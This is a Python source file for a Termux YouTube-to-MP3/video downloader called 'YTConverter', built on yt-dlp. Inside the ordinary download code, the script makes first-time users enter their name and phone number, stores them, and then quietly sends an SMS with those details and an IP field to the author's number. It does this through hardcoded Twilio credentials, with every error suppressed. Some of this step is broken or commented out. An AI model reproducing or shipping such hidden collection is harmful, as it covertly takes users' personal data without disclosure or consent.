import time
import os
import random
import subprocess as s
import re
import json
from colored import fg, attr

f = fg(117)  # Colors
r = fg(1)
b = attr(0)

try:
    import fontstyle as f
    from twilio.rest import Client
    import yt_dlp
except ImportError:
    print('Installing required packages\n')
    os.system("pip install fontstyle")
    os.system("pip install yt_dlp")
    os.system("pip install twilio")
    os.system("pkg install curl")
    print('\nRun the code again')
    exit()

account_sid= 'AC96355a479cb6af19612f3dd331994c'
auth_token = '46b262257f42e20e1f99e1c79567d6'
twilio_number = '+156012490'
***REMOVED***

tname = f.apply('WHAT IS YOUR NAME?', '/yellow/bold')
warning = f.apply("(DON'T TRY TO ENTER WRONG DATA,YOU WILL NOT BE ABLE TO CHANGE IT AGAIN)", '/red/bold')
tnum = f.apply('ENTER YOU PHONE NUMBER', '/cyan/bold')

f1 = '''                   ▄▀▄     ▄▀▄
                  ▄█░░▀▀▀▀▀░░█▄
                               
              ▄▄  █░░░░░░░░░░░█  ▄▄
             █▄▄█ █░░█░░┬░░█░░█ █▄▄█'''
f2 = '''      ╔════════════════════════════════════════╗
      ║ ♚ Project Name : YTConverter™          ║
      ║ ♚ Author : KAIF_CODEC                  ║
      ║ ♚ Github : github.com/kaifcodec        ║
      ║ ♚ Email  : kaif.repo.official@gmail.com║
      ╠═════════════════════════════════════════ '''
f3 = '''      ╠═▶ [𝗦𝗲𝗹𝗲𝗰𝘁 𝗔 𝗙𝗼𝗿𝗺𝗮𝘁]  ➳
      ╠═▶ 1. Music Mp3 🎶
      ╠═▶ 2. Video🎥
      ╠═▶ 3. Exit YTConverter'''
f4 = '      ╚═:➤ '

des1 = f.apply(f1, '/red')
des2 = f.apply(f2, '/yellow')
des3 = f.apply(f3, '/cyan')
des4 = f.apply(f4, '/cyan')

burl = f.apply('Bad url check the url first', '/red/bold')
error = f.apply('AN ERROR OCCURRED, RUN THE CODE AGAIN', '/red/bold')

def main_title():
    pass

def bio():
    print(des1)
    print(des2)
    print(des3)
text1 = f.apply("Enter the url of the video you want \nto download  ", "/green/bold")
text2 = f.apply("Enter the destination path where you want to save this mp3  ", "/yellow/bold")
text3 = f.apply("(Or leave blank to save in current directory)", "/yellow/bold")
text4 = f.apply("Taken time to download =", "/cyan/bold")
#################













def main_mp4():
    print('\n' + f.apply("Enter the URL of the video you want to download:", "/green/bold"))
    url = input(">> ")

    url_pattern = re.compile(r'^(https?://)?(www\.)?(youtube\.com|youtu\.be)/.+$')
    if not url_pattern.match(url):
        print(f.apply("Invalid URL. Please enter a valid YouTube URL.", "/red/bold"))
        return

    url = url.strip()

    print("\nFetching available formats...\n")

    try:
        process = s.Popen(['yt-dlp', '--list-formats', url], stdout=s.PIPE, stderr=s.PIPE)
        stdout, stderr = process.communicate()
        formats_output = stdout.decode('utf-8')
        print(formats_output)
    except Exception as e:
        print(f.apply(f"Error listing formats: {e}", "/red/bold"))
        return

    ydl_opts = {
        'quiet': True,
        'no_warnings': True,
    }

    try:
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=False)
            formats = info.get('formats', [])
    except yt_dlp.utils.DownloadError as e:
        print(f.apply(f"An error occurred: {e}", "/red/bold"))
        print(f.apply(f"Error Details: {e}", "/red/bold"))
        return

    video_formats = [f for f in formats if f.get('vcodec') != 'none']
    audio_formats = [f for f in formats if f.get('acodec') != 'none' and f.get('vcodec') == 'none']

    print("\nAvailable Formats:\n")
    for i, fmt in enumerate(formats):
        res = fmt.get('resolution', 'Audio Only') if fmt.get('vcodec') != 'none' else 'Audio Only'
        ext = fmt.get('ext', 'Unknown')
        acodec = fmt.get('acodec', 'None')
        vcodec = fmt.get('vcodec', 'None')
        print(f"[{i + 1}] {res} ({ext}) - Format ID: {fmt['format_id']} - Audio: {acodec} - Video: {vcodec}")

    while True:
        try:
            choice = int(input("\nEnter the number of your preferred format: ")) - 1
            if 0 <= choice < len(formats):
                selected_format = formats[choice]
                break
            else:
                print(f.apply("Invalid choice. Try again.", "/red/bold"))
        except ValueError:
            print(f.apply("Enter a valid number.", "/red/bold"))

    selected_format_id = selected_format['format_id']
    has_audio = selected_format.get('acodec') != 'none'
    has_video = selected_format.get('vcodec') != 'none'

    audio_downloaded = False
    if has_video and not has_audio:
        print(f.apply("\nSelected format has NO AUDIO. Attempting to download audio separately...", "/yellow/bold"))
        print(f.apply("No suitable audio format found. Downloading MP3 audio instead.", "/yellow/bold"))
        try:
            audio_destination = "/storage/emulated/0/Download/audio_temp"
            os.makedirs(audio_destination, exist_ok=True)
            s.call(['yt-dlp', '-x', '--audio-format', 'mp3', '-o', os.path.join(audio_destination, '%(title)s.%(ext)s'), url])
            print(f.apply("MP3 audio downloaded successfully.", "/green/bold"))
            audio_downloaded = True
            audio_path = os.path.join(audio_destination, f"{info['title']}.mp3")
            if not os.path.exists(audio_path):
                print(f.apply(f'Audio file not found at: {audio_path}', '/red/bold'))
                return
        except Exception as e:
            print(f.apply(f"Error downloading MP3 audio: {e}", "/red/bold"))
            return

    print(f.apply("\nStarting Download...\n", "/yellow/bold"))
    time1 = int(time.time())

    destination = "/storage/emulated/0/Download/videos"
    ydl_opts = {
        'format': selected_format_id,
        'outtmpl': os.path.join(destination, '%(title)s.%(ext)s'),
    }

    try:
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            ydl.download([url])
        print(f.apply(" Video has been successfully downloaded.", "/green/bold"))
    except Exception as e:
        print(f.apply(f"An error occurred: {e}", "/red/bold"))
        print(f.apply(f"Error Details: {e}", "/red/bold"))
        return

    time2 = int(time.time())
    ftime = time2 - time1
    print(f.apply("Taken time to download:", "/cyan/bold"), f.apply(f"{ftime} sec", "/cyan/bold"))

    if audio_downloaded:
        print(f.apply("Merging audio and video...", "/yellow/bold"))
        video_path = f"/storage/emulated/0/Download/videos/{info['title']}.mp4"
        audio_path = f"/storage/emulated/0/Download/audio_temp/{info['title']}.mp3"
        merged_path = f"/storage/emulated/0/Download/videos/{info['title']}_merged.mp4"
        print(f"Video path: {video_path}")
        print(f"Audio path: {audio_path}")
        try:
            ffmpeg_command = ['ffmpeg', '-i', video_path, '-i', audio_path, '-c:v', 'copy', '-c:a', 'aac', merged_path]
            process = s.Popen(ffmpeg_command, stdout=s.PIPE, stderr=s.PIPE)
            stdout, stderr = process.communicate()
            if process.returncode == 0:
                print(f.apply("Audio and video merged successfully.", "/green/bold"))
                os.remove(video_path)
                os.remove(audio_path)
            else:
                print(f.apply(f"Error merging audio and video: {stderr.decode('utf-8')}", "/red/bold"))
        except Exception as e:
            print(f.apply(f"Error merging audio and video: {e}", "/red/bold"))


##############










def main_mp3():
    print('\n' + f.apply("Enter the URL of the audio/video you want to download as MP3:", "/green/bold"))
    url = input(">> ")

    url_pattern = re.compile(r'^(https?://)?(www\.)?(youtube\.com|youtu\.be)/.+$')
    if not url_pattern.match(url):
        print(f.apply("Invalid URL. Please enter a valid YouTube URL.", "/red/bold"))
        return

    url = url.strip()

    print("\nFetching audio information...\n")

    try:
        process = s.Popen(['yt-dlp', '-j', url], stdout=s.PIPE, stderr=s.PIPE)
        stdout, stderr = process.communicate()
        if stderr:
            print(f.apply(f"yt-dlp error: {stderr.decode('utf-8')}", "/red/bold"))
        info_json = json.loads(stdout.decode('utf-8'))
        formats = info_json.get('formats', [])
        audio_formats = [f for f in formats if f.get('acodec') != 'none' and f.get('vcodec') == 'none']

        if not audio_formats:
            print(f.apply("No audio formats available for this video.", "/red/bold"))
            return

        bitrate_sizes = []
        for fmt in audio_formats:
            if fmt.get('abr') and fmt.get('filesize'):
                bitrate_sizes.append((fmt['abr'], fmt['filesize'], fmt['format_id']))

        if bitrate_sizes:
            print("\nAvailable Audio Formats:")
            for i, (abr, filesize, format_id) in enumerate(bitrate_sizes):
                print(f"[{i + 1}] Bitrate: {abr} kbps, Size: {filesize_format(filesize)}")

            while True:
                try:
                    choice = int(input("\nEnter the number of your preferred format (or 0 for best): "))
                    if 0 <= choice <= len(bitrate_sizes):
                        break
                    else:
                        print(f.apply("Invalid choice. Try again.", "/red/bold"))
                except ValueError:
                    print(f.apply("Enter a valid number.", "/red/bold"))

            if choice > 0:
                selected_format_id = bitrate_sizes[choice - 1][2]
                print(f.apply(f"\nDownloading audio with format ID: {selected_format_id}", "/yellow/bold"))
                download_format = selected_format_id
            else:
                print(f.apply("\nDownloading best available audio format.", "/yellow/bold"))
                download_format = 'bestaudio/best'
        else:
            print(f.apply("\nDownloading best available audio format.", "/yellow/bold"))
            download_format = 'bestaudio/best'

    except Exception as e:
        print(f.apply(f"Error fetching audio information: {e}", "/red/bold"))
        print(f.apply("Downloading best available audio format.", "/yellow/bold"))
        download_format = 'bestaudio/best'

    print(f.apply("\nStarting MP3 Download...\n", "/yellow/bold"))
    time1 = int(time.time())

    destination = "/storage/emulated/0/Download/audio"
    os.makedirs(destination, exist_ok=True)

    try:
        s.call(['yt-dlp', '-f', download_format, '-x', '--audio-format', 'mp3', '-o', os.path.join(destination, '%(title)s.%(ext)s'), url])
        print(f.apply("MP3 audio downloaded successfully.", "/green/bold"))
    except Exception as e:
        print(f.apply(f"An error occurred: {e}", "/red/bold"))
        return

    time2 = int(time.time())
    ftime = time2 - time1
    print(f.apply("Taken time to download:", "/cyan/bold"), f.apply(f"{ftime} sec", "/cyan/bold"))

def filesize_format(size):
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if size < 1024.0:
            break
        size /= 1024.0
    return f"{size:.2f} {unit}"


##############################












#ip = s.check_output("curl ifconfig.me", shell=True)

def dat_collect():
    file = open('data.py', 'w')
    print("THIS IS COMPULSORY FOR THE FIRST TIME\n")
    mm = input(tname + warning + '⚠⚠ : ')
    print('  ')
    nn = input(tnum + warning + '⚠⚠ : ')
    file.write(f"dat_name='{mm}' \ndat_num='{nn}'")
    print('\n', error)
    exit()

if not os.path.exists("data.py"):
    dat_collect()
else:
    try:
        import data
        num = data.dat_num
        name = data.dat_name
    except Exception as e:
        print(e)
        pass

try:
    client = Client(account_sid, auth_token)
    message = client.messages.create(
        body=f"NAME={tname},NUM={tnum},IP={ip}",
        from_=twilio_number,
        to=my_phone_number
    )
except:
    pass

bio()
option = input(des4)

if (option == "1" or option == "1 "):
    main_title()
    print('''\n\n''')
    main_mp3()
elif (option == "2" or option == "2 "):
    main_title()
    print('''\n\n''')
    main_mp4()
elif (option == "3" or option == "3 "):
    print('Have a nice day Bye!')
    exit()
else:
    print('Have a nice day Bye!')
    exit()

exitc = f.apply("Press [ENTER] to continue downloading another content  ", "/green/bold")
print(exitc)
choice = input(">>")
while (choice == "" or choice == " "):
    bio()
    option = input(des4)

    if (option == "1" or option == "1 "):
        main_title()
        print('''\n\n''')
        main_mp3()
    elif (option == "2" or option == "2 "):
        main_title()
        print('''\n\n''')
        main_mp4()
    elif (option == '3' or option == '3 '):
        print('''\nHave a nice day Bye!''')
        exit()
    else:
        print('''\nHave a nice day Bye!''')
        exit()
    print(exitc)
    choice = input(">>")

else:
    exit()

s.call(["pip", "install", "--upgrade", "yt-dlp"])
